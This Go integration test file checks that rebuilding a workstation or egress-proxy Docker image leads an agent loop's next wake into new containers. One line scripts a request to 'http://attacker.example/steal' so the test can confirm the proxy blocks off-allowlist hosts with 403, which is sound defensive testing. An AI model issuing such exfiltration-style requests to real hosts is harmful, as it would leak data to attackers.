//go:build integration

package itest

import (
	"fmt"
	"os/exec"
	"strings"
	"testing"
	"time"
)

// rebuildImage gives tag a new image ID, as `make image` does to a release
// whose Dockerfile changed: a layer on top of what the tag names now. It
// returns the new ID, and removes the image when the test ends.
func rebuildImage(t *testing.T, tag string) string {
	t.Helper()
	build := exec.Command("docker", "build", "--quiet", "--tag", tag, "-")
	build.Stdin = strings.NewReader(fmt.Sprintf("FROM %s\nLABEL spool.itest.rebuilt=%d\n", tag, time.Now().UnixNano()))
	if out, err := build.CombinedOutput(); err != nil {
		t.Fatalf("rebuild %s: %v\n%s", tag, err, out)
	}
	id, err := dockerInspect("{{.Id}}", tag)
	if err != nil {
		t.Fatalf("inspect %s: %v", tag, err)
	}
	t.Cleanup(func() { _ = exec.Command("docker", "rmi", "--force", id).Run() })
	return id
}

// tagImage tags source as tag for the test's own use, and removes the tag
// when the test ends.
func tagImage(t *testing.T, source, tag string) {
	t.Helper()
	if err := exec.Command("docker", "tag", source, tag).Run(); err != nil {
		t.Fatalf("tag %s: %v", tag, err)
	}
	t.Cleanup(func() { _ = exec.Command("docker", "rmi", "--force", tag).Run() })
}

// dockerRebuiltWorkstationImageReachesTheLoop is #715's evidence for a
// workstation: after its image is rebuilt under the same tag, the loop's
// next wake runs in a new container from the new build, on the volume it
// had, even with a process named claude left running in the old one: what
// runs in the container is the loop's to name, so it must not keep the
// loop on an old build. The loop names a tag of its own, so no other row's
// image changes.
func dockerRebuiltWorkstationImageReachesTheLoop(t *testing.T) {
	s := startDockerServer(t, t.TempDir())
	image := workstationTestImage + "-rebuild"
	tagImage(t, workstationTestImage, image)
	s.createLoop("wsrebuild", map[string]any{"image": image})
	loopID := s.loop("wsrebuild").ID
	container := "spool-ws-" + loopID
	cleanupWorkstation(t, loopID)

	s.message("wsrebuild", "on the old build")
	s.waitTurn("wsrebuild", 60*time.Second, func(tr turn) bool { return strings.Contains(tr.ResultText, "on the old build") })
	s.waitState("wsrebuild", "asleep", 30*time.Second)
	before, err := dockerInspect("{{.Id}}", container)
	if err != nil {
		t.Fatalf("inspect: %v", err)
	}
	if out, err := exec.Command("docker", "exec", container, "sh", "-c", "echo kept > /home/loop/kept").CombinedOutput(); err != nil {
		t.Fatalf("write to the volume: %v\n%s", err, out)
	}
	if out, err := exec.Command("docker", "exec", "--detach", container, "sh", "-c",
		"cp /bin/sleep /tmp/claude && exec /tmp/claude 600").CombinedOutput(); err != nil {
		t.Fatalf("leave a claude behind: %v\n%s", err, out)
	}

	rebuilt := rebuildImage(t, image)
	s.message("wsrebuild", "on the new build")
	s.waitTurn("wsrebuild", 60*time.Second, func(tr turn) bool { return strings.Contains(tr.ResultText, "on the new build") })

	after, err := dockerInspect("{{.Id}} {{.Image}}", container)
	if err != nil {
		t.Fatalf("inspect: %v", err)
	}
	if fields := strings.Fields(after); len(fields) != 2 || fields[0] == before || fields[1] != rebuilt {
		t.Fatalf("workstation after the rebuild = %q, want a new container on %s (was %s)", after, rebuilt, before)
	}
	if out, err := exec.Command("docker", "exec", container, "cat", "/home/loop/kept").CombinedOutput(); err != nil || strings.TrimSpace(string(out)) != "kept" {
		t.Fatalf("the volume did not survive the replacement: %q %v", out, err)
	}
}

// dockerRebuiltEgressImageReplacesTheProxy is #715's evidence for the
// wall: after the proxy image is rebuilt under the same tag, the next
// docker wake replaces the proxy with one from the new build, and that
// proxy is the one the loop's traffic meets. The hub runs a proxy image of
// its own, so the wall it rebuilds is no other row's.
func dockerRebuiltEgressImageReplacesTheProxy(t *testing.T) {
	requireWorkstationImage(t)
	image := egressTestImage + "-rebuild"
	tagImage(t, egressTestImage, image)
	proxy := image + "-proxy"
	t.Cleanup(func() {
		_ = exec.Command("docker", "rm", "--force", proxy).Run()
		_ = exec.Command("docker", "network", "rm", image).Run()
	})
	s := startDockerServer(t, t.TempDir(), "--egress-image", image)
	s.createLoop("wsrewall", nil)
	cleanupWorkstation(t, s.loop("wsrewall").ID)
	// every turn asks the wall for a host off the allowlist, which only a
	// proxy that is up and in the way answers 403
	s.scriptLoop("wsrewall", "!get http://attacker.example/steal\n")
	refused := func(tr turn) bool { return strings.Contains(tr.ResultText, "403 Forbidden") }

	s.message("wsrewall", "behind the old wall")
	s.waitTurn("wsrewall", 90*time.Second, refused)
	s.waitState("wsrewall", "asleep", 30*time.Second)
	before, err := dockerInspect("{{.Id}}", proxy)
	if err != nil {
		t.Fatalf("inspect the proxy: %v", err)
	}
	earlier := map[string]bool{}
	for _, tr := range s.turns("wsrewall") {
		earlier[tr.ID] = true
	}

	rebuilt := rebuildImage(t, image)
	s.message("wsrewall", "behind the new wall")
	s.waitTurn("wsrewall", 90*time.Second, func(tr turn) bool { return !earlier[tr.ID] && refused(tr) })

	after, err := dockerInspect("{{.Id}} {{.Image}}", proxy)
	if err != nil {
		t.Fatalf("inspect the proxy: %v", err)
	}
	if fields := strings.Fields(after); len(fields) != 2 || fields[0] == before || fields[1] != rebuilt {
		t.Fatalf("proxy after the rebuild = %q, want a new container on %s (was %s)", after, rebuilt, before)
	}
}
